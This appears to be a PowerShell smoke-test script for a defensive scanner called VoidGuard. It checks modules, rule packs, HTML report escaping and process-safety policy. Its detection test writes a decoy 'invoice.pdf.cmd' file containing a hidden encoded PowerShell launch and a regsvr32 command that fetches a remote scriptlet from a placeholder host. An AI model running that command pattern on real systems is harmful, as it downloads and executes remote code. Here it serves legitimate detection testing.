Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$root = Split-Path -Parent $PSScriptRoot
$errorsFound = New-Object System.Collections.Generic.List[string]
$files = @((Join-Path $root 'VoidGuard.ps1')) + @(
    Get-ChildItem -LiteralPath (Join-Path $root 'Modules') -Filter '*.psm1' -File |
        Select-Object -ExpandProperty FullName
)

foreach ($file in $files) {
    $tokens = $null
    $parseErrors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tokens, [ref]$parseErrors) | Out-Null
    foreach ($parseError in @($parseErrors)) {
        $errorsFound.Add("${file}:$($parseError.Extent.StartLineNumber): $($parseError.Message)")
    }
}
if ($errorsFound.Count -gt 0) {
    $errorsFound | ForEach-Object { Write-Error $_ }
    throw "PowerShell parser found $($errorsFound.Count) error(s)."
}

$requiredFiles = @(
    'VoidGuard.cmd',
    'VERSION',
    'Config\settings.json',
    'Assets\skulls\main.txt',
    'Rules\known-bad-hashes.json',
    'Rules\trusted-publishers.json',
    'Rules\Packs\core\manifest.json',
    'Rules\Packs\core\detections.json',
    'Rules\Packs\core\core.yar',
    'Modules\VoidGuard.Persistence.psm1',
    'Modules\VoidGuard.Remediation.psm1',
    'Modules\VoidGuard.RulePacks.psm1',
    'Modules\VoidGuard.Reporting.psm1',
    'Modules\VoidGuard.IntegritySnapshot.psm1',
    'Modules\VoidGuard.IntegrityBaseline.psm1',
    'Modules\VoidGuard.DefenderOffline.psm1'
)
foreach ($relative in $requiredFiles) {
    if (-not (Test-Path -LiteralPath (Join-Path $root $relative))) { throw "Required file is missing: $relative" }
}

$settings = Get-Content -LiteralPath (Join-Path $root 'Config\settings.json') -Raw | ConvertFrom-Json
if ([int]$settings.maxFilesPerScan -lt 1) { throw 'maxFilesPerScan must be positive.' }
if ([int]$settings.minimumPersistenceScore -lt 1) { throw 'minimumPersistenceScore must be positive.' }
if ([int]$settings.maximumDisplayedFindings -lt 1) { throw 'maximumDisplayedFindings must be positive.' }
if ([int]$settings.yaraTimeoutSeconds -lt 1) { throw 'yaraTimeoutSeconds must be positive.' }
if ([long]$settings.yaraMaxFileSizeBytes -lt 1024) { throw 'yaraMaxFileSizeBytes is too small.' }
if ([int]$settings.entropySampleBytes -lt 1024) { throw 'entropySampleBytes is too small.' }

try {
    $statusOutput = & (Join-Path $root 'VoidGuard.ps1') -Mode Status -Professional -NoAnimation -Json
    $statusText = $statusOutput | Out-String
    if ([string]::IsNullOrWhiteSpace($statusText)) { throw 'Status command returned no output.' }
    $status = $statusText | ConvertFrom-Json
    if ($status.PSObject.Properties.Name -notcontains 'IsAdministrator') { throw 'Status output is missing IsAdministrator.' }
} catch {
    throw "Status smoke test failed: $($_.Exception.Message)"
}

$moduleOrder = @(
    'VoidGuard.Animation.psm1',
    'VoidGuard.Protection.psm1',
    'VoidGuard.RulePacks.psm1',
    'VoidGuard.Scanner.psm1',
    'VoidGuard.System.psm1',
    'VoidGuard.Persistence.psm1',
    'VoidGuard.Remediation.psm1',
    'VoidGuard.Quarantine.psm1',
    'VoidGuard.Reporting.psm1',
    'VoidGuard.IntegritySnapshot.psm1',
    'VoidGuard.IntegrityBaseline.psm1',
    'VoidGuard.DefenderOffline.psm1',
    'VoidGuard.UI.psm1'
)
foreach ($moduleName in $moduleOrder) {
    Import-Module (Join-Path $root "Modules\$moduleName") -Force -DisableNameChecking
}

foreach ($commandName in @(
    'Get-VoidGuardPersistenceFindings',
    'Get-VoidGuardFileLockOwners',
    'Register-VoidGuardDeleteOnReboot',
    'Get-VoidGuardPendingRemediations',
    'Test-VoidGuardProcessSafeToStop',
    'Get-VoidGuardRulePackInventory',
    'Get-VoidGuardRuleEngineState',
    'Get-VoidGuardYaraStatus',
    'Get-VoidGuardPeInfo',
    'Export-VoidGuardReportBundle'
)) {
    if (-not (Get-Command $commandName -ErrorAction SilentlyContinue)) { throw "Exported command is missing: $commandName" }
}

$tempRoot = Join-Path ([IO.Path]::GetTempPath()) ('VoidGuard-Test-' + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
try {
    $context = New-VoidGuardContext -RootPath $root -Settings $settings -Professional -NoAnimation
    $inventory = @(Get-VoidGuardRulePackInventory -Context $context)
    $corePack = @($inventory | Where-Object { $_.Id -eq 'voidguard.core' } | Select-Object -First 1)
    if ($corePack.Count -ne 1) { throw 'Bundled core rule pack was not discovered.' }
    if (-not $corePack[0].Trusted -or -not $corePack[0].IntegrityValid) {
        throw "Bundled core rule pack failed validation: $($corePack[0].Errors -join '; ')"
    }

    $engine = Get-VoidGuardRuleEngineState -Context $context
    if ($engine.Patterns.Count -lt 8) { throw 'Expected core pattern rules were not loaded.' }
    if ($engine.YaraRuleFiles.Count -lt 1) { throw 'Expected core YARA rule file was not loaded.' }
    if ($engine.Yara.PSObject.Properties.Name -notcontains 'Available') { throw 'YARA status contract is incomplete.' }

    $samplePath = Join-Path $tempRoot 'invoice.pdf.cmd'
    "@echo off`r`npowershell.exe -WindowStyle Hidden -EncodedCommand AAAA`r`nregsvr32.exe /s /n /u /i:https://example.invalid/demo.sct scrobj.dll" |
        Set-Content -LiteralPath $samplePath -Encoding ASCII
    try {
        $finding = Test-VoidGuardFile -Path $samplePath -Context $context -KnownBadHashes @{} -RuleEngine $engine
    } catch {
        Write-Host '--- SCANNER EXCEPTION ---' -ForegroundColor Red
        Write-Host ($_.Exception.ToString()) -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
        Write-Host ($_.InvocationInfo.PositionMessage) -ForegroundColor Yellow
        throw
    }
    if (-not $finding -or $finding.Score -lt 40) { throw 'Heuristic sample did not cross the expected score.' }
    if (@($finding.RuleMatches | Where-Object { $_.Rule -eq 'VG-LOL-001' }).Count -ne 1) {
        throw 'Core rule VG-LOL-001 did not match the defensive sample.'
    }
    if ($null -eq $finding.Entropy) { throw 'Entropy analysis returned no result.' }

    $policy = Test-VoidGuardProtectedTarget -Path $samplePath
    if (-not $policy.Allowed) { throw 'A normal temporary test file was unexpectedly blocked by policy.' }

    $stream = [IO.File]::Open($samplePath, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::None)
    try { $null = @(Get-VoidGuardFileLockOwners -Path $samplePath) } finally { $stream.Dispose() }

    $currentProcess = Get-Process -Id $PID -ErrorAction Stop
    if ($currentProcess.Path) {
        $decision = Test-VoidGuardProcessSafeToStop -Id $PID -TargetPath $samplePath
        if ($decision.Allowed) { throw 'Process safety policy allowed a process whose executable does not match the target.' }

        $pe = Get-VoidGuardPeInfo -Path $currentProcess.Path
        if (-not $pe.IsPE) { throw 'PE parser did not recognize the current PowerShell executable.' }
        if ([string]::IsNullOrWhiteSpace([string]$pe.Architecture)) { throw 'PE architecture was not resolved.' }
    }

    $reportObject = [pscustomobject]@{
        Version = 'test'
        Mode = 'Custom'
        FilesScanned = 1
        Findings = @([pscustomobject]@{
            Risk = 'HIGH'
            Score = 77
            Path = 'C:\Temp\<script>.exe'
            SignatureStatus = 'NotSigned'
            Entropy = 7.7
            SHA256 = 'ABC'
            YaraMatches = @([pscustomobject]@{ Rule = 'TestRule' })
            Reasons = @('<unsafe>')
        })
    }
    $reportBase = Join-Path $tempRoot 'report-output'
    $reportFiles = @(Export-VoidGuardReportBundle -InputObject $reportObject -Context $context -OutputPath $reportBase -Format Both)
    if ($reportFiles.Count -ne 2) { throw 'Report bundle did not return two files.' }
    foreach ($reportFile in $reportFiles) {
        if (-not (Test-Path -LiteralPath $reportFile -PathType Leaf)) { throw "Report file is missing: $reportFile" }
    }
    $html = Get-Content -LiteralPath ($reportFiles | Where-Object { $_ -like '*.html' }) -Raw
    if ($html -match '<script>') { throw 'HTML report did not encode untrusted finding text.' }
    $json = Get-Content -LiteralPath ($reportFiles | Where-Object { $_ -like '*.json' }) -Raw | ConvertFrom-Json
    if ($json.schemaVersion -ne 1) { throw 'JSON report schema version is invalid.' }
} finally {
    Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host 'VoidGuard v0.3 smoke tests passed.' -ForegroundColor Green
